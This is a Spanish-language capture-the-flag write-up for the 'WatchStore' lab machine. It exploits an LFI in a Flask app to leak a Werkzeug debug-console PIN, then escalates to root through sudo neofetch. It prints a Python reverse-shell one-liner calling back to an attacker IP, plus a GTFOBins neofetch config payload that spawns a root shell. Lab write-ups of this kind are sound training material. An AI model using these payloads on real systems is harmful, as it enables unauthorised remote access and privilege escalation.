# WatchStore

<img width="1347" height="629" alt="image" src="https://github.com/user-attachments/assets/344f84b1-ed37-4fdd-8d31-6f0102910cd8" />
 
**Plataforma:** The Hackers Labs  
**Dificultad:** Fácil  
**OS:** Linux  
**Fecha:** 30/07/2026
 
## 0. Resumen
 
Máquina Linux fácil que simula una galería de fotos de relojes montada sobre una aplicación Flask/Werkzeug
 
El camino de explotación combina:
- Enumeración de directorios sobre una app Python expuesta en un puerto no estándar
- Explotación de un LFI para leer el código fuente de la propia aplicación
- Extracción de un PIN filtrado en el código, usado para desbloquear una consola Python interactiva expuesta (Werkzeug debug console)
- Ejecución remota de comandos desde dicha consola
- Escalada a root abusando de `neofetch` con permisos sudo (GTFOBins)
  
## 1. Reconocimiento

   Ping

```bash
ping -c 2 <IP>
```

<img width="981" height="138" alt="image" src="https://github.com/user-attachments/assets/98fdba49-b4ec-4259-bf77-ef86449ac581" />

→ TTL=64 sugiere que se trata de un host Linux
 
   Nmap
 
```bash
nmap -sCV -Pn -n --open -p- --min-rate 5000 <IP> -oA watchstore
```

| Orden | Función |
|---|---|
| `-sCV` | Ejecución de Scripts y detección de Versión de servicios |
| `-Pn` |  Omite descubrimiento de host |
| `-n` | Sin resolución de DNS |
| `--open` | Muestra únicamente puertos abiertos |
| `-p-` | Escanea todos los puertos (65535) |
| `--min-rate` | Acelera escaneo enviando 5000 paquetes por segundo |
| `-oA` | Output en todos los formatos (.namp, .xml, .gnmap) |
 
**Resultados:**
 
- Puerto 22: OpenSSH 9.2p1 (Debian 12)
  
- Puerto 8080: Werkzeug httpd 2.1.2 (Python 3.11.2), con redirección a `http://watchstore.thl:8080/`
  
Werkzeug es el servidor de desarrollo de Flask, lo que sugiere que puede haber quedado activo en modo debug
 
## 2. Configuración de DNS local
 
```bash
echo "<IP> watchstore.thl" | sudo tee -a /etc/hosts
```
 
Se añade la entrada correspondiente para resolver `watchstore.thl` a la IP de la máquina, ya que el servidor exige ese dominio para servir contenido en lugar de responder a la IP directa
 
## 3. Enumeración web

<img width="1228" height="692" alt="image" src="https://github.com/user-attachments/assets/c9b2a5ad-d6e6-42a1-9591-741f7a468218" />
 
### 3.1 Exploración manual
 
La web sirve una galería de fotos de relojes. No hay enlaces internos que apunten a funcionalidad adicional, por lo que el siguiente paso es fuzzing de directorios
 
### 3.2 Fuzzing de directorios
 
```bash
gobuster dir -u http://watchstore.thl:8080 -w /usr/share/wordlists/directory-list-lowercase-2.3-medium.txt -x html,php,txt,py,sh
```
 
| Orden | Función |
|---|---|
| `-u` | URL objetivo |
| `-w` | Diccionario de rutas |
| `-x` | Extensiones a probar |

<img width="1083" height="108" alt="image" src="https://github.com/user-attachments/assets/3c1914e0-8555-4496-bb49-a54bedeadb9e" />
 
**Resultados de interés:**
 
- `/products`: (200) listado de productos de la tienda
  
- `/read`: (500) lanza una excepción por falta de un parámetro `id`. Es el propio error el que revela la ruta del código fuente: `/home/relox/watchstore/app.py`
  
- `/console`: (200) consola interactiva de Python bloqueada por PIN, con un mensaje que indica que el PIN se envía a la salida estándar del servidor
  
Estos tres hallazgos definen directamente la siguiente fase: `/read` da pie a leer archivos del servidor, y `/console` es el objetivo final una vez se consiga el PIN
 
## 4. Explotación — LFI para filtrar el PIN

<img width="1115" height="584" alt="image" src="https://github.com/user-attachments/assets/58241327-8533-4d64-a234-ed8ace3d6529" />
 
El error 500 de `/read` confirma que el parámetro `id` se usa para leer un archivo del sistema sin validación suficiente. Se aprovecha para leer el propio código de la aplicación y localizar cómo se genera el PIN de la consola
 
```bash
curl "http://watchstore.thl:8080/read?id=/home/relox/watchstore/app.py"
```
<img width="1213" height="493" alt="image" src="https://github.com/user-attachments/assets/c1cf735e-0a37-4aeb-b9a6-7bb758f7abc3" />

→ El código fuente devuelto contiene el PIN de la consola de depuración en texto plano `612-791-734`
 
## 5. Acceso inicial — Consola Python interactiva

<img width="1243" height="252" alt="image" src="https://github.com/user-attachments/assets/399c262d-97e2-449b-8772-177bd8cd3dbd" />
 
Con el PIN obtenido se desbloquea `/console`, lo que da una consola Python interactiva ejecutándose en el contexto del servidor
 
### 5.1 Preparación del listener
 
```bash
nc -lvnp 443
```
 
### 5.2 Reverse shell desde la consola
 
```python
import socket,os,pty;s=socket.socket();s.connect(("<IP_ATACANTE>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```
 
El uso del módulo `socket` para abrir la conexión y `pty.spawn` para adjuntar una shell interactiva es necesario porque la consola solo permite ejecutar código Python, no comandos de shell directamente. Este payload traduce el acceso a Python en una shell completa
 
→ Se obtiene acceso como el usuario `relox`
 
### 5.3 Tratamiento de la TTY
 
```bash
script /dev/null -c bash
```
 
Seguido de `Ctrl+Z`, y:
 
```bash
stty raw -echo; fg

reset xterm

export TERM=xterm

export SHELL=/bin/bash
```
 
Este tratamiento es necesario porque una reverse shell básica no dispone de una TTY completa (sin autocompletado, sin señales, sin control de trabajos). Estos pasos estabilizan la sesión para trabajar con comodidad
 
## 6. Escalada a root
 
### 6.1 Enumeración de privilegios sudo
 
```bash
sudo -l
```

<img width="1163" height="44" alt="image" src="https://github.com/user-attachments/assets/751c2b38-8b55-45e1-ace5-2068f24d55de" />

→ El usuario `relox` puede ejecutar `/usr/bin/neofetch` como root sin contraseña
 
### 6.2 Explotación de `neofetch` (GTFOBins)

<img width="945" height="196" alt="image" src="https://github.com/user-attachments/assets/60a84a81-989d-49e2-845f-692ccc0f19dd" />
 
`neofetch` acepta un archivo de configuración personalizado mediante `--config`, y ese archivo de configuración se interpreta como código, lo que permite ejecutar comandos arbitrarios con los privilegios del usuario que lo invoca (root en este caso)
 
```bash
TF=$(mktemp)

echo 'exec /bin/bash' > $TF

sudo neofetch --config $TF
```
 
| Orden | Función |
|---|---|
| `TF=$(mktemp)` | Crea un archivo temporal |
| `echo 'exec /bin/bash' > $TF` | Escribe en ese archivo el comando a ejecutar |
| `sudo neofetch --config $TF` | Fuerza a `neofetch` a cargar la configuración manipulada, ejecutándola como root |
 
→ Se obtiene una shell como root.
 
## 7.1 Primera flag (relox)

```bash
cat /home/relox/user.txt
```

## 7.2 Segunda flag (root)

```bash
cat /root/root.txt
```

## 8. Lecciones aprendidas

<img width="1176" height="541" alt="image" src="https://github.com/user-attachments/assets/b04df7f4-9180-47c4-8eea-fcb373ad66a6" />

- Los mensajes de error pueden filtrar rutas absolutas del sistema, útiles para dirigir un LFI
  
- Un LFI que permite leer el propio código fuente de la aplicación puede exponer secretos hardcodeados (PINs, claves, credenciales)
  
- Las consolas de depuración de Werkzeug/Flask nunca deben estar accesibles en producción, incluso con PIN, ya que ese PIN puede filtrarse por otras vías
  
- `sudo -l` es obligatorio tras cualquier acceso, y GTFOBins es la referencia para comprobar si un binario permitido (incluso uno tan inofensivo como `neofetch`) puede usarse para escalar privilegios
